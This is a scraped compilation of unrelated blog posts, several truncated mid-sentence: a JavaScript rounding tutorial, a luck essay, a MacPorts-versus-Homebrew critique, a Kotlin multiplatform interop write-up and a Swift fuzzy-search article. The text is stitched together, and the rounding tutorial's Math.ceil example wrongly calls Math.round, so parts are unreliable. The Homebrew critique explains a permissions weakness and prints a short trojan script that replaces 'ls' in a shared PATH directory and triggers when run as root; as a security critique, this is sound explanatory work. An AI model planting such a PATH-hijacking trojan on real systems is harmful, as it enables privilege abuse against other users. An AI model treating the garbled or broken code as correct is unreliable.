<p>Creating unique tools for yourself, working on a product, or a range of products is beneficial, whether you keep working for clients later on or not. It is a good idea to start by designing something that you need and would use. Something simple, or even incomplete is good enough for a start. The <a href="https://gum.co/soon-jekyll">first Jekyll project</a> I released was super minimal, not even a complete theme, but it was useful to learn, and a first step. What is interesting is that each tool or product you build informs the next. You learn from trials and errors, and you never know, but there is a good chance that something useful to you will be to someone else.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598114170225/ZYW09ru63.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><h2 id="introduction">Introduction</h2>
<p>We all have learned about rounding off numbers in our school. We usually increase the integer if its value is &gt;=.5 and decrease it, if it is &lt;= .4.</p>
<blockquote>
<p>1.5 ≈ 2</p>
<p>1.4 ≈ 1</p>
</blockquote>
<p>We all know JavaScript has a built-in object called Math, which has properties and methods for mathematical constants and functions. </p>
<p>We have three methods that are mostly used to round off a number in JS, i.e., <code>Math.ceil()</code>, <code>Math.floor()</code>, <code>Math.round()</code>. Let's explore them in this article.</p>
<p><img src="https://media.giphy.com/media/U5D3QY0QQWsR0nhwmg/giphy.gif" alt=""></p>
<h2 id="mathceil">🎳 Math.ceil</h2>
<p><code>Math.ceil</code> function in JavaScript is used to round of a number that is passed into it to its nearest integer in upward direction of rounding. What to I mean by upward direction? Towards the greater value. <code>Math.ceil()</code> takes only one parameter that is the value to be rounded.  So, if we have a value of 1.4, <code>Math.ceil()</code> will round off it to 2.</p>
<pre><code><span>console</span>.log(<span>Math</span>.ceil(<span>1.4</span>)); 

<span>console</span>.log(<span>Math</span>.ceil(<span>1.6</span>)); 

<span>console</span>.log(<span>Math</span>.round(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.round(<span>-1.6</span>));

</code></pre>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Ceiling_function.svg/800px-Ceiling_function.svg.png" alt=""><em>Photo from <a target="_blank" href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions#/media/File:Ceiling_function.svg">Wikipedia</a></em></p>
<h2 id="mathfloor">🎳 Math.floor()</h2>
<p>Where the <code>Math.ceil</code> method returns the smallest integer greater than or equal to the value we pass, <code>Math.floor</code> returns the largest or equal integer less than the given value. It also takes a single parameter. </p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Floor_function.svg/800px-Floor_function.svg.png" alt=""><em>Photo from <a target="_blank" href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions#/media/File:Floor_function.svg">Wikipedia</a></em></p>
<p>So, if we pass the same value 1.4 in <code>Math.floor</code>, we'll get 1 in return. Even if we pass 1.6, we'll also get 1.</p>
<pre><code><span>console</span>.log(<span>Math</span>.floor(<span>1.4</span>));

<span>console</span>.log(<span>Math</span>.floor(<span>1.6</span>));

<span>console</span>.log(<span>Math</span>.floor(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.floor(<span>-1.6</span>));

</code></pre>
<h2 id="mathround">🎳 Math.round()</h2>
<p><code>Math.round()</code> rounds off the number depending on the fractional part of the number. So, if the fractional part is &gt;=.5, it'll return the smallest integer greater than the passed value and if the number is &lt;=.4 we'll get the largest integer smaller than the number we pass. </p>
<pre><code><span>console</span>.log(<span>Math</span>.round(<span>1.4</span>));

<span>console</span>.log(<span>Math</span>.round(<span>1.6</span>));

<span>console</span>.log(<span>Math</span>.round(<span>1.5</span>)); 

<span>console</span>.log(<span>Math</span>.round(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.round(<span>-1.6</span>));

<span>console</span>.log(<span>Math</span>.round(<span>-1.5</span>));

</code></pre>
<p>So, Math.round() can go both upward and downward depending on the fractional Part.</p>
<p><img src="https://i.ibb.co/YcZbNhd/mathfloor.png" alt=""></p>
<h2 id="mathtrunc">🎳 Math.trunc()</h2>
<p>There's another method available in JS Math object that is <code>Math.trunc()</code>. <code>Math.trunc()</code> returns the integer part of a number by removing any fractional part of the number.</p>
<pre><code><span>console</span>.log(<span>Math</span>.trunc(<span>1.4</span>));

<span>console</span>.log(<span>Math</span>.trunc(<span>1.6</span>));

<span>console</span>.log(<span>Math</span>.trunc(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.trunc(<span>-1.6</span>));

</code></pre>
<h2 id="conclusion">Conclusion</h2>
<p>Rounding off numbers is an essential part of programming. I hope this article revisited your memories about different built-in rounding off methods we have in JavaScript. Leave an ❤ if you found this article helpful. 😊</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="44" id="block-yui_3_17_2_1_1598060086803_34477"><div><blockquote>
<p>“The amount of good luck coming your way depends on your willingness to act.” – Barbara Sher</p>
</blockquote>
<p>Luck has nothing to do with chance. Luck has everything to do with <em>chances.</em></p>
<p>Getting lucky is a skill. The people we consider lucky are simply better at it than others. They get lucky for a reason - and it’s not the rabbit’s foot in their pocket.</p>

<p>Luck is not winning the lottery or finding a pot of gold. This is <strong><em>chance</em></strong>, not luck.</p>
<p>Getting lucky is about seizing opportunity. The luckiest people have <strong><em>more opportunities</em></strong> and <strong><em>consistently seize them.</em></strong></p>
<p>To visualize luck in action, picture yourself as a target in a wide-open field. On the other side of the field stands an archer, firing arrows toward you. Each of these arrows is one of life's opportunities. Each arrow that hits your target is an opportunity seized.</p>
<p>Trying to land one of these opportunities, you set up in the middle of the field, patiently waiting for one to fall.</p>
<p>But the field you're on has only one archer, and they have horrendous aim. On top of that, you're a small target, sitting hundreds of yards away. For all you know, it could be months before an arrow falls anywhere close, let alone hits you.</p>
<p>This may be how you think about luck - which is why you never get lucky. You see luck as a game of chance, a game over which you have little control.</p>
<p>Lucky people have a different outlook. They see luck as a game of skill, a game over which they have <em>all</em> the control.</p>
<p>First, lucky people don't set themselves up in an open field with one novice archer. They search for the field with hundreds of expert archers and set themselves up there. This way, arrows are whizzing all around them. This gives them <strong><em>more opportunities.</em></strong></p>
<p>Second, lucky people don’t settle for being a small target. The best archers in the world will still struggle to hit a target if it’s too small. So lucky people spend their time becoming a bigger target. This helps them <strong><em>seize more opportunities.</em></strong></p>
<p>Both steps are important. The biggest target in the world will never get hit by a novice archer. And even hundreds of expert archers will struggle to hit a super small target.</p>
<p>To get lucky, you need to have more opportunities and make it easier to seize them.</p>

<blockquote>
<p>“Good luck is when opportunity meets preparation, while bad luck is when lack of preparation meets reality.” – Eliyahu Goldratt</p>
</blockquote>
<p>Since getting lucky is a skill, you can get better at it. Guided by the following mental models, you can make decisions and take actions to put you on the path to getting lucky.</p>
<h3 id="george-s-razor"><strong>George's Razor</strong></h3>
<p>When making a decision, choose the path that leads to more luck. Make the decision that involves talking to more people, exploring a new area, or learning new skills.</p>
<p>For example, say it’s Saturday night and you have plans to meet up with two new people. It’s 7:30, pouring rain, and you’re hoping they’re the ones to cancel. But the alternative is six episodes of something on Netflix. Which do you choose?</p>
<p>George’s Razor says you grab your umbrella and head out. It might not be this one, but eventually one of these decisions will lead to new opportunities.</p>
<p>To get lucky, consistently make the luckier choice.</p>
<h3 id="leverage"><strong>Leverage</strong></h3>
<p>Time, energy, and attention are scarce resources. To get more out of them, you need to leverage them.</p>
<p>Compared to regular activities, high leverage activities lead to more opportunities for the same amount of input. The more time, energy, and attention you spend on these activities, the more opportunities you will have.</p>
<p>For example, consider how you spend two hours on a Sunday afternoon. You could spend those two hours on a Zoom meeting with someone new. This would lead to meeting one new person every week, slowly but steadily increasing your opportunities.</p>
<p>Or, you could spend two hours writing a <a href="http://dickiebush.substack.com/">weekly newsletter</a>, conversing with hundreds of people in the same amount of time. This leads to meeting hundreds of people every week. And you’ll probably meet their friends too, and their friend’s friends.</p>
<p>To get lucky, leverage your time, energy, and attention.</p>
<h3 id="fat-tails"><strong>Fat Tails</strong></h3>
<p>There are two ways to model the world - normal distributions (bell curves) and power law distributions (80/20 curves). Nassim Taleb has made a career about explaining the differences, so I'll leave the technical details to him.</p>
<p>The simplest example is weight versus wealth. If you took every person in New York City and sorted them by their weight, it would look like a bell curve. Most people would fall in the middle, with a few very heavy people and very light people on the edges. At most, the heaviest person would be 10 times the weight of the lightest person.</p>
<p>But if you sorted every person by wealth, it would look like an 80/20 curve. Almost everyone would fall on the far left of the distribution. But the wealthiest person would be way out on the right edge. In this distribution, the wealthiest person isn't 10 times as wealthy as the poorest person, they are 10 million times as wealthy. The wealth distribution has <em>fat tails.</em></p>
</div></div><div data-block-type="44" id="block-yui_3_17_2_1_1598060086803_61325"><div><p>Lucky people focus on these fat tails. They understand that the best opportunities aren't worth 10 times more than the average, but 10 million times more. So they do everything possible to expose themselves to them.</p>
<p>To get lucky, focus on the fat tails.</p>
<h3 id="serendipity-vehicles"><strong>Serendipity Vehicles</strong></h3>
<p>For opportunities to find you, you need to be easy to find. Being easy to find leads to serendipity - those encounters and opportunities that happen purely due to chance.</p>
<p>To be easy to find, you need a <em>serendipity vehicle</em> - something you create that makes it easy for others to find you. Your serendipity vehicle should be something you produce regularly that shows other people what you're interested in. This makes it easy for people to see that you view the world the same way they do.</p>
<p>The easiest way is to start by sharing the work <a href="http://dickiebush.com/articles/sharing">you're already doing</a>. The two best ways to do this are to <a href="http://dickiebush.substack.com/subscribe">start a weekly newsletter</a> and <a href="http://twitter.com/dickiebush">tweet about what you're working on</a>. You'll be surprised how many like-minded individuals will find you when you start sharing this way.</p>
<p>To get lucky, start a serendipity vehicle.</p>

<p>Few people are willing to credit the role of luck in their life. Acknowledging how lucky they've been would cut against the story they tell themselves about their success. It was their 90-hour weeks, relentless focus, and pure determination that brought about their success, not luck.</p>
<p>But this is the wrong way to think about it.</p>
<p>Instead, your goal should be for everyone to think you got lucky, knowing in fact you did. But only because you had more opportunities, and did a better job seizing them.</p>

<p>It has never been easier to get lucky. The internet has unlocked opportunities on an unimaginable scale. Better yet, you can quickly set yourself to ensure those opportunities find you.</p>
<p>To seize them, make the lucky choice, seek leverage, focus on the fat tails, and start a serendipity vehicle.</p>
<p>Best of luck.</p>

	<p>A couple of months ago, I uninstalled <a href="https://brew.sh/">Homebrew</a> and migrated my configuration to <a href="https://www.macports.org/">MacPorts</a>. I’ve been doing a lot of thinking about the state of package management on macOS, and here’s what I’ve come up with based on my experiences using both and interacting with their development communities.</p>

<h2 id="a-brief-history-of-package-managers-on-macos">A brief history of package managers on macOS</h2>

<p>Package management on macOS has a somewhat complex history, mostly owing to the fact that unlike most Linux distributions, macOS does not ship with a default package manager out of the box. It’s not surprising that one of the first projects to solve the problem of package management, <a href="http://www.finkproject.org/">Fink</a>, was created very early, with its initial releases predating that of Mac OS X 10.0 by several months. Using Debian’s dpkg and APT as its backend, Fink is still actively maintained, though I haven’t looked at it very closely.</p>

<p>MacPorts, on the other hand, was released in 2002 as part of <a href="https://en.wikipedia.org/wiki/Darwin_(operating_system)#OpenDarwin">OpenDarwin</a>, while Homebrew was released seven years later as a “solution” to many of the shortcomings that the author saw in MacPorts. In case it isn’t obvious from the introduction, it’s these two that we’ll be talking about. Sorry, Fink :(</p>

<h2 id="architecture">Architecture</h2>

<p>While both MacPorts and Homebrew try to solve the same problem, they really are designed quite differently from each other. These differences become immediately evident once you start using them: I personally feel that MacPorts is clearly the better architected, more mature package manager of the two.</p>

<h3 id="to-sudo-or-not-to-sudo">To <code>sudo</code> or not to <code>sudo</code></h3>

<p>Homebrew makes several questionable design decisions, but one of these deserves its own section: the choice to <a href="https://github.com/Homebrew/brew/blob/21bb9f6f5b535c35e1c3e5c1e2327c46d5756e80/docs/FAQ.md#why-does-homebrew-say-sudo-is-bad">explicitly eschew root</a> (in fact, it will refuse to work at all if run this way). This fundamentally is a <em>very bad idea</em>: package managers that install software for all users of your computer, as Homebrew does by default, should <em>always</em> require elevated privileges to function correctly. This decision has important consequences for both security and usability, especially with the advent of System Integrity Protection in OS X El Capitan.</p>

<p>For quite a while, Homebrew essentially considered itself the owner of <code>/usr/local</code> (both metaphorically and literally, as it would change the permissions of the directory), to the point where it would do things like plop its README down directly into this folder. After rootless was introduced, it moved most of its files to subdirectories; however, to maintain the charade of “sudo-less” installation, Homebrew will still trash the permissions of folders inside <code>/usr/local</code>. Homebrew’s <a href="https://github.com/Homebrew/brew/blob/2be7999878702554f1e1b5f4118978e670e6156c/docs/Troubleshooting.md#check-for-common-issues">troubleshooting guide</a> lists these out, because reinstalling macOS sets the permissions back to what they’re supposed to be and breaks Homebrew in the process:</p>

<blockquote>
  <p>If commands fail with permissions errors, check the permissions of <code>/usr/local</code>’s subdirectories. If you’re unsure what to do, you can run <code>cd /usr/local &amp;&amp; sudo chown -R $(whoami) bin etc include lib sbin share var opt Cellar Caskroom Frameworks</code>.</p>
</blockquote>

<p>Telling users to use <code>sudo</code> as a hammer to smash permissions “issues” that arise as a result of the system trying to fix damage caused by supposedly “sudo-less” software is quite ironic (and this is a bad practice in and of itself: it’s teaching users to fix problems by blindly running <code>sudo chown -R</code>). But really, this is <em>bad, bad</em> advice. Not only does this make Homebrew completely unusable for multi-user systems, it opens up a security hole (actually, <a href="https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43">multiple</a>): with <code>/usr/local/bin</code> being shared (and the first in <code>$PATH</code>!!), it’s not hard to see how changing the permissions on this directory leads to trouble. Consider a malicious shell script running with the privileges of the current user (perhaps something <a href="https://brew.sh/#install">you found on the internet</a>?) that makes a file at <code>/usr/local/bin/ls</code>:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>if</span> <span>[[</span> <span>$(</span><span>id</span> <span>-u</span><span>)</span> <span>-eq</span> 0 <span>]]</span><span>;</span> <span>then
	</span><span>echo </span>pwned <span># you didn't happen to run "sudo ls", did you?</span>
<span>else
	</span><span>ls</span> <span>"</span><span>$@</span><span>"</span> <span># move along, nothing to see here</span>
<span>fi</span>
</code></pre></div></div>

<p>Boom, now <code>ls</code> is booby-trapped for everyone on the system.</p>



<h3 id="the-macports-philosophy">The MacPorts philosophy</h3>

<p>MacPorts, on the other hand, swings so far in the other direction that it’s actually borderline inconvenient to use in some sense. Philosophically, MacPorts has a very different perspective of how it should work: it tries to prevent conflicts with the system as much as possible. To achieve this, it sets up a hierarchy under <code>/opt</code> (which is the annoying bit, because this directory is not on <code>$PATH</code> by default, nor is picked up by compilers without some prodding).</p>

<p>Of course, this design means that there is a single shared installation is among users, so running <code>port</code> requires elevated privileges whenever performing an operation that affects all users (which, admittedly, is most of the time). MacPorts is smart about this, though: it will shed permissions and run as the <code>macports</code> user whenever possible.</p>

<p>In line with their stated philosophy to prevent conflicts with macOS, MacPorts will set up its own tools in isolation from those provided by the system (in fact, builds run in “sandboxes” under the <code>macports</code> user, where attempts to access files outside of the build directory–which includes system tools–are intercepted and blocked). This means MacPorts needs to install some “duplicate” tools (whereas Homebrew will try to use the ones that come with your system where possible), the downside of which is that there is an one-time “up-front” cost as it installs base packages. The upside is that this approach is significantly more contained, which makes it easier to manage and more likely to continue working as macOS changes under it.</p>

<p>Finally, MacPorts just seems to have a lot of thought put into it with regards to certain aspects: for example, <a href="https://guide.macports.org/chunked/internals.registry.html">the MacPorts Registry database</a> is backed by SQLite by default, which makes easily introspectable in case something goes wrong. Another useful feature is built-in “livechecks” for most ports, which codify upstream version checks and make it easy to see when MacPorts’s package index need to be updated.</p>

<h2 id="day-to-day-usage">Day-to-day usage</h2>

<p>Architecture aside, a package manager is only useful if it’s possible to actually use it. There are a couple of subareas that I feel are important, and we’ll look at how each package manager does for each in turn.</p>

<h3 id="package-availability">Package availability</h3>

<p>Nominally, MacPorts has <a href="https://www.macports.org/ports.php?by=all">over 20,000 ports</a> ports available to install by default, while Homebrew has <a href="https://formulae.brew.sh/formula/">just shy of 5,000</a> formulae (plus a couple thousand more in homebrew/cask). Of course, the only thing this really tells us is that both of them have a <em>lot</em> of packages; both of these numbers are pretty meaningless as they contain things like versioned packages and other kinds of number-inflation. If you are looking for a popular, established package, neither will disappoint: packages like <code>gcc</code>, <code>vim</code>, and <code>wget</code> are available and up-to-date on both MacPorts and Homebrew.</p>

<p>Where availability starts to differ is with lesser-used packages: MacPorts seems to have quite a few older packages that Homebrew never picked up, while Homebrew is more likely to have newer packages. Homebrew’s are slightly more up-to-date, but I think this is likely a result of having fewer packages to manage and more support to do this job, as well as an increased proclivity to remove packages that are hard to get working on the latest version of macOS. Overall, I don’t think it’s fair to say that either package manager has an advantage here; ultimately this comes down to what you will end up needing. If you’re switching between the two, it’s almost guaranteed that there’s going to be something that’s conspicuously missing from the new package manager to annoy you ;)</p>

<h3 id="usability">Usability</h3>

<p>Homebrew aims to be simple and easy to use, and in general this is true. While I’m neutral on the use of beer-related terminology and emoji, the judicious use of color is quite helpful, as is the well-formatted output. Most common usecases are straightforward, though occasionally commands can end up doing surprising things if you use them in strange ways.</p>

<p>MacPorts, on the other hand, is by no means unusable, but it’s not as polished as Homebrew is. The lack of color, as well as somewhat more cluttered and less relevant output, makes it a bit less pleasant to work with (I have a couple of patches that I apply to get the behavior I want, but expecting most users to do this is unreasonable of course). However, overall, MacPorts handles being more complex quite well, and should be pretty serviceable for most users–especially those who have used another package manager.</p>

<p>The two package mangers differ in how they distribute packages: MacPorts almost always builds packages from source, while Homebrew has continuously gotten less and less permissive of letting you do this (opting instead for downloading pre-built binaries). From a usability perspective, binaries are a clear winner: packages install much quicker and are usable nearly immediately, and you don’t leave your computer barely usable because it’s been compiling the newest version of LLVM for the last four hours. Overall, however, this is less of a problem than it may seem at first, since most package are small and build relatively quickly, making long <code>port upgrade outdated</code> invocations quite rare.</p>

<h3 id="features">Features</h3>

<p>While both package managers have the basic functionality you’d expect from a package manager, MacPorts is generally much more full featured than Homebrew is. Part of this is probably a result of architectural disparities, one example of which being that Homebrew’s set of commands to manage the dependency tree is somewhat limited. While this is unfortunate, having these limitations is somewhat reasonable given the underlying design, which would make implementing these features difficult.</p>

<p>Less justifiable is Homebrew’s habit of missing useful but slightly less-commonly used functionality (some of which have been mentioned above), and in extreme cases <em>removing</em> features entirely, or crippling them so that they are significantly less usable. Into this dubious category goes useful functionality like the ability to find and …</p></section></article></div></div>

</h6>
        
        <p>At Autodesk, my colleagues and I are more than a year and a half into our Kotlin multiplatform (KMP) shared library journey. That’s one Kotlin shared library, shared among our three mobile platforms that we support for the PlanGrid app (iOS, Android, and Windows).</p>

<p>Most new feature development for the PlanGrid app starts in the shared library now. It has become so much an extension of our main application that we’re planning a move to a mono-repo (iOS, Android, Windows, and the KMP shared library all in one place) later this year, which will help solve some of our scale issues (great problem to have all things considered).</p>

<h2 id="making-it-work">Making it Work</h2>

<p>Looking back, there were a few things that made Kotlin work well for us that have to do with a combination of developer experience and our team. Early on, the few of us working on the proof-of-concept and pitching KMP to the rest of the team focused on developer experience. We ensured that integrating our experiment wouldn’t get in the way of day-to-day work by distributing it to iOS as a binary framework via CocoaPods (already integrate other binary frameworks this way without issue).</p>

<p>While testing out KMP-based functionality alongside all of the other work going on, we made use of feature flags in case shit hit the fan in production. Once we had our foot in the door, had proved things worked well, and had come up with a plan for how the library was going to evolve, the next step was getting people to adopt the shared library for their teams’ features.</p>

<p>This again takes us back to developer experience. Lucky for us, KMP comes with iOS interop out-of-the-box. It’s so good that one of my colleagues thought they were using some kind of bridging layer that we must have written to make Kotlin feel Swift-y. When they command-clicked through to source, they were surprised to find the KMP-generated shared library header.</p>

<h3 id="having-a-good-team-helps">Having a Good Team Helps</h3>

<p>Did I mention we have a Windows team? For that side of things, we got lucky. The level of support from KMP you get for Windows does not measure up to what you get for iOS. On the Windows side, my colleagues would like to have a C# library in the style of the KMP-generated Obj-C library with the nice, generated headers that we get on iOS. Instead, they get a library that uses C-interop— quite a different experience. Fortunate for us, a few folks on our Windows team were experienced and interested enough to write and maintain their own C# code generation on top of that. We hope to open source it later this year.</p>

<h2 id="looking-at-interop">Looking at Interop</h2>

<p>To recap, these elements made it possible for KMP to work well for us:</p>

<ol>
  <li>Ease of integration on iOS and Android</li>
  <li>Ergonomic interop out-of-the-box for iOS</li>
  <li>Colleagues on our Windows team willing to take on the challenge of solving the interop issues there</li>
</ol>

<p>If I could only pick one, it would be the interop on iOS that allowed this to become as successful as it has for us. It would be a much tougher sell, for example, had both the iOS and Windows teams needed to spend loads of effort on interop.</p>

<p>My favorite example of this great interop is one from <a href="https://benasher.co/kotlin-ios-getting-started-interop/">my earlier post</a>, where Phill and I wrote about the iOS interop:</p>

<figure><pre><code data-lang="kotlin"><span>// Kotlin</span>
<span>enum</span> <span>class</span> <span>LogLevel</span> <span>{</span>
    <span>ERROR</span><span>,</span>
    <span>WARNING</span><span>,</span>
    <span>INFO</span><span>,</span>
    <span>DEBUG</span>
<span>}</span>

<span>class</span> <span>Logger</span> <span>{</span>
    <span>companion</span> <span>object</span> <span>default</span> <span>{</span>
        <span>fun</span> <span>log</span><span>(</span><span>level</span><span>:</span> <span>LogLevel</span> <span>=</span> <span>LogLevel</span><span>.</span><span>ERROR</span><span>,</span> <span>message</span><span>:</span> <span>String</span><span>,</span> <span>completion</span><span>:</span> <span>(</span><span>Boolean</span><span>)</span> <span>-&gt;</span> <span>Unit</span><span>)</span> <span>{</span> <span>}</span>
    <span>}</span>
<span>}</span></code></pre></figure>

<figure><pre><code data-lang="swift"><span>// Swift</span>
<span>Logger</span><span>.</span><span>default</span><span>.</span><span>log</span><span>(</span><span>.</span><span>error</span><span>,</span> <span>"An error ocurred"</span><span>)</span> <span>{</span>
    <span>// Closure</span>
<span>}</span></code></pre></figure>

<p>This example highlights some idiomatic Kotlin that allows you to write idiomatic-looking Swift. It’s impressive. However, this example has a secret. It also highlights many of the areas where Kotlin/Native interop with iOS has room for improvement. With Kotlin 1.4.0 out the door, I hope now is a good time to raise these issues. Fixing them would take the sell to iOS teams to the next level, at least in terms of having excellent interop. I’ll discuss the issues in increasing in order of how long it took our team to notice and bump into them.</p>

<h3 id="exhaustive-enums">Exhaustive Enums</h3>

<p>This is one of the earliest areas, for which I filed <a href="https://github.com/JetBrains/kotlin-native/issues/2521">an issue</a> in the Kotlin/Native GitHub. Enums are a great way to describe an input for an API, such as the above log method. However, we ran into problems with Kotlin enums as soon as we wanted to do an exhaustive <code>switch</code> (equivalent to exhaustive <code>when</code> in Kotlin) over them in Swift.</p>

<p>The problem lies in how enums are represented in Kotlin compared to Obj-C (remember Swift is irrelevant for comparison— interop is via Swift-y feeling Obj-C). Enums in Kotlin are reference types (a special <code>class</code>). In Obj-C, they’re integers. Attempting to <code>switch</code> over them from Swift would be like trying to <code>switch</code> over any other class instance that you defined in Swift, for example. The Swift compiler doesn’t know that there happens to be a finite number of instances of that <code>enum class</code> like Kotlin does.</p>

<p>There is a workaround though that can improve the ergonomics a bit. You can define a matching C-style enum (with a matching name), and <a href="https://github.com/JetBrains/kotlin-native/issues/2521#issuecomment-453009890">redefine the ordinal property</a> as having that type. At Autodesk, we do this with a bit of fragile (albeit has worked in our codebase with only one minor tweak since its creation) code generation that adds these C-style enums to the Obj-C framework header as Obj-C extensions on all of our enum types. With that, we get exhaustive <code>switch</code> for all of our Kotlin enums, by doing a <code>switch</code> over the ordinal property.</p>

<p>In the above sample code, you can see there’s no problem passing enums around. You wouldn’t have any idea about how Kotlin enums are represented, until you go to <code>switch</code> on one.</p>

<h3 id="companion-objects">Companion Objects</h3>

<p>In <a href="https://benasher.co/kotlin-ios-getting-started/">my first article</a>, I mentioned how, as an iOS developer, I found the <code>companion object</code> a bit strange at first, but I get it now. As my iOS colleagues have become better acquainted with them, we have begun to see them more often in our shared library. The problem comes if you don’t know that you can name a <code>companion object</code>, like in the above example. Unnamed ones are more common, in my experience. Here is what the Swift code would look like, if we hadn’t named the above <code>companion object</code> “default”:</p>

<figure><pre><code data-lang="swift"><span>// Swift</span>
<span>Logger</span><span>.</span><span>Companion</span><span>()</span><span>.</span><span>log</span><span>(</span><span>.</span><span>error</span><span>,</span> <span>"An error ocurred"</span><span>)</span> <span>{</span>
    <span>// Closure</span>
<span>}</span></code></pre></figure>

<p>As someone who writes a lot of Swift, this looks funny at first. Are we creating a new <code>Logger.Companion</code>? If so, where can I see what this does in Kotlin? The ergonomics of the unnamed <code>companion object</code> is another issue that <a href="https://github.com/JetBrains/kotlin-native/issues/2757">I filed early on</a>. To answer the question, <a href="https://github.com/JetBrains/kotlin-native/issues/2757#issuecomment-472866293">you aren’t creating a new</a> <code>Logger.Companion</code>.</p>

<p>The fix here isn’t straightforward. You can convince your team to prefer naming a <code>companion object</code>, but that doesn’t always make sense, if say your goal is to use a <code>companion object</code> to namespace a public constant. Solutions discussed in the ticket would be breaking changes. That said, I think improving the ergonomics here would be an easy way to prevent less enthusiastic iOS developers from having this easy (and small) thing to point at. At Autodesk, we just acknowledge this quirk of the Obj-C export and move on. But, that’s easy for us to do now, as we have a critical mass.</p>

<h3 id="default-arguments">Default Arguments</h3>

<p>Although we bumped into this one later on, a fix for this would make the biggest difference for our team right now because our dependence on KMP has grown. If you notice in the above Kotlin, the log function has a default argument. However, you cannot use that default argument from Swift. As a log parameter, this might not be that important. In other contexts though, this could be a default integer parameter, for example. In that case, it can be near impossible to know what argument you should pass in the “default” case. To avoid bugs, your best bet is to go back to the Kotlin source and find the answer.</p>

<p>Though, I’ve heard folks say: but Swift supports default arguments, why shouldn’t this work? This is often the first place folks begin to internalize that this doesn’t matter. The interop is via Obj-C, so all that matters is what Obj-C supports. You can repeat this same answer for a bevy of similar complaints. <code>Interface</code> extensions? Swift supports the equivalent <code>protocol</code> extensions. Obj-C does not. Optional primitive types? Obj-C doesn’t have those either. None of this is a knock on Kotlin/Native’s interop, which again is great! Obj-C interop was the correct and stable choice at the time, as that was before Swift had a stable ABI. I made comments about this in my previous <a href="https://benasher.co/kotlin-ios-getting-started-interop/">interop article</a>, so let’s go back to the issue at hand.</p>

<p>Default arguments have a solution in Kotlin/JVM interop, which is used in hand-written Obj-C as well: <a href="https://youtrack.jetbrains.com/issue/KT-38685">generated overloads</a>. Generating overloads for C and Obj-C KMP libraries would be a huge improvement to Kotlin/Native’s export facilities. I hope with Kotlin 1.4.0 out the door, time can be made for this one.</p>

<h3 id="enums---missing-exports">Enums - Missing Exports</h3>

<p>I want to go back to enums for a moment. I mentioned that I would review the issues in the order that my team ran into them. After getting more comfortable using Kotlin enums in our code, we began to come up with cases where we wanted to enumerate Kotlin enums. However, the needed <code>values()</code> function <a href="https://youtrack.jetbrains.com/issue/KT-38530">is not exported to Obj-C by default</a>. If you need this, you’re left to define it yourself in your library and have it call the equivalent function. The workaround is fine, but it gets in the way, when the library you’re using is one that’s already packaged up and distributed. A fix requires another PR and waiting on another CI deploy.</p>

<h3 id="translation-to-obj-c-primitives">Translation to Obj-C Primitives</h3>

<p>The final one I want to talk about is the most minor, but we do come across it on occasion. In the above example, we are hiding the fact that the completion closure has one parameter. It’s a Kotlin <code>boolean</code>, but it is translated to Obj-C as a <code>KotlinBoolean</code> <code>class</code>. This is bound to happen if the type is optional. Again, Obj-C doesn’t support optional primitives. In this case however, it’s not. It should be a <code>BOOL</code> …</p></article></div></div></section></div></div>

<![CDATA[A Fast Fuzzy Search Implementation]]>

August 22, 2020 | https://www.objc.io/blog/2020/08/18/fuzzy-search/ | <a href="https://web.archive.org/web/*/https://www.objc.io/blog/2020/08/18/fuzzy-search/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>  <div> <p>In recent episodes of Swift Talk, we’ve been building a <a href="https://talk.objc.io/collections/quick-open">fast fuzzy search implementation</a>. Fuzzy search is typically used to search a large list of file names by typing a few relevant characters (like Open Quickly in Xcode). For example, to find a file named <code>Sources/Slides/ContentView.swift</code>, you might type <code>SSCV</code>. The simplest version of a fuzzy search algorithm could be implemented using a regular expression: for the search string <code>SSCV</code>, the regular expression would be something like <code>*S*S*C*V*</code>. In other words, it needs to match the characters <code>SSCV</code>, in that order, but with any number of other characters before, after or in between the characters.</p> <p>Here’s another simple implementation:</p> <pre><code>extension String {
    func fuzzyMatch(_ needle: String) -&gt; Bool {
        if needle.isEmpty { return true }
        var remainder = needle[...]
        for char in self {
            if char == remainder[remainder.startIndex] {
                remainder.removeFirst()
                if remainder.isEmpty { return true }
            }
        }
        return false
    }
}
</code></pre> <p>The code works well and is quite fast in an optimized build. We can improve performance by comparing the <code>UTF8View</code> of both strings instead of their characters. This might return some incorrect results if your strings contains things like combining sequences, but is typically not a problem when searching files.</p> <h2>Scoring</h2> <p>The algorithm works very well if all you want to know is whether a filename matches the search string, but in most fuzzy search implementations you’re searching a list of files, and want to rank them by how well they match. Consider the following two file names, which both match <code>string</code>:</p> <pre><code>source/test/regression/graph.swift
^      ^    ^      ^ ^ ^

source/string.swift
       ^^^^^^
</code></pre> <p>When we search for the word <code>string</code>, we’d like the first file to be ranked below the second file. Although the first file contains the characters <code>string</code> in the right order, they are separated by large gaps. The second file contains them without any gaps. In other words, we don’t just want to match file names, we also want to rank them based on the quality of the match, like the number of gaps and gap sizes.</p> <p>We can modify our algorithm to compute a score: when we match a character, we remember the position of that match. We then take the distance between the previous match and current match (the <em>gap</em>) and compute a <em>gap penalty</em>. The gap penalty could be very straightforward, such as the length of the gap, or it could be more complicated, for instance as a constant plus the square root of the length. What function you use depends on the exact use case. In addition, you might want to penalize the gap before the first match and the gap after the last match separately (or not at all).</p> <blockquote> <p>Like before, we can make our algorithm faster by running it on <code>UTF8View</code> instead of on <code>String</code>, but keep in mind that this can change the scoring as well. For example, gap lengths between matches might differ as a character might consist of multiple bytes.</p> </blockquote> <p>Matching a character isn’t as straightforward as just calling <code>==</code> either. For example, when searching for the character 